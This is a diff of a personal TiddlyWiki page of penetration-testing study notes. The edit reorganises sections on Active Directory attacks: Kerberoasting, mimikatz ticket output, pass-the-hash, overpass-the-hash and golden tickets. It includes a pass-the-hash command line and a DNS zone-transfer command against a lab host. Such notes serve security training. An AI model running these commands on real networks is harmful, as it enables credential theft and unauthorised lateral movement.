@@ -431,6 +431,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Active Directory Exploitation</li>
 
+<li>Active Directory Exploitation - Authentication</li>
+
 <li>Admin</li>
 
 <li>Aesthetics</li>
@@ -498,6 +500,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <li>Docker</li>
 
 <li>Domain Name System</li>
+
+<li>Draft of 'Active Directory Exploitation - Authentication'</li>
 
 <li>Draft of 'LinEnum'</li>
 
@@ -10125,7 +10129,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20211224142936076" modified="20211224142936076" title="$:/state/toc/TableOfContents/Tech-Operations/IT--118161433">
 <pre>open</pre>
 </div>
-<div created="20211224141359734" list="[[Penetration Testing]] [[Post Exploitation]] [[Active Directory Exploitation]] Exploitation [[Password Cracking]] Pivoting" modified="20211228141249912" title="$:/StoryList">
+<div created="20211224141359734" list="[[Penetration Testing]] [[Post Exploitation]] [[Active Directory Exploitation]] Exploitation [[Brute Forcing]] [[Password Cracking]] Pivoting" modified="20211228152509752" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11116,7 +11120,7 @@ http://marlinfw.org/docs/gcode/M302.html
 # [[Project Work]]
 # [[Economics|https://drive.google.com/open?id=1TPLzZ9AZ3WjlCvFcmPdK7OZKEtZ4KUGT]]</pre>
 </div>
-<div created="20211209113521474" modified="20211228141636110" title="Active Directory Exploitation" type="text/x-markdown">
+<div created="20211209113521474" modified="20211228141710776" title="Active Directory Exploitation" type="text/x-markdown">
 <pre>https://attack.stealthbits.com/how-golden-ticket-attack-works
 
 
@@ -11152,7 +11156,31 @@ https://www.ired.team/offensive-security-experiments/active-directory-kerberos-a
 # 2. Authentication
 
 [Active Directory Exploitation - Authentication](#Active Directory Exploitation - Authentication)
-## Kerberoast
+
+# 3. Lateral Movement
+
+## 3.1 Pass The Hash
+
+    pth-winexe -U offsec%00000000000000000000000000000000:&lt;ntlm_hash&gt; //&lt;ip&gt; cmd
+
+## 3.2 Overpass The Hash
+
+we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+
+## 3.3 Pass The Ticket
+
+
+
+## 3.4 Distributed Component Object Model
+
+
+
+# 4. Persistence
+
+Golden Tickets</pre>
+</div>
+<div created="20211228141658974" modified="20211228141707113" title="Active Directory Exploitation - Authentication" type="text/x-markdown">
+<pre>## Kerberoast
 
 https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
 
@@ -11211,28 +11239,7 @@ Generating Ticket
        Client Name       : jeff_admin @ corp.com
        Flags 40a00000    : pre_authent ; renewable ; forwardable ;
 
-    mimikatz #
-# 3. Lateral Movement
-
-## 3.1 Pass The Hash
-
-    pth-winexe -U offsec%00000000000000000000000000000000:&lt;ntlm_hash&gt; //&lt;ip&gt; cmd
-
-## 3.2 Overpass The Hash
-
-we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user
-
-## 3.3 Pass The Ticket
-
-
-
-## 3.4 Distributed Component Object Model
-
-
-
-# 4. Persistence
-
-Golden Tickets</pre>
+    mimikatz #</pre>
 </div>
 <div created="20191104235731828" modified="20191105042822561" title="Admin">
 <pre>! Past
@@ -11662,11 +11669,13 @@ Particle Burst
 
 </pre>
 </div>
-<div created="20211225121057724" modified="20211225121109888" title="Brute Forcing">
+<div created="20211225121057724" modified="20211228153822642" title="Brute Forcing">
 <pre>
 Crunch 
 
-https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/</pre>
+https://null-byte.wonderhowto.com/how-to/tutorial-create-wordlists-with-crunch-0165931/
+
+[[Active Directory Exploitation - Password Spraying]]</pre>
 </div>
 <div created="20210816001432704" modified="20210816001444953" title="Business">
 <pre>Sell things on Carousell
@@ -12123,6 +12132,9 @@ Enumerate the host. Use domain names such as those
 ```
 dig axfr @10.10.10.13 cronos.htb
 ```</pre>
+</div>
+<div modified="20211228141709059" title="Draft of 'Active Directory Exploitation - Authentication'">
+<pre></pre>
 </div>
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
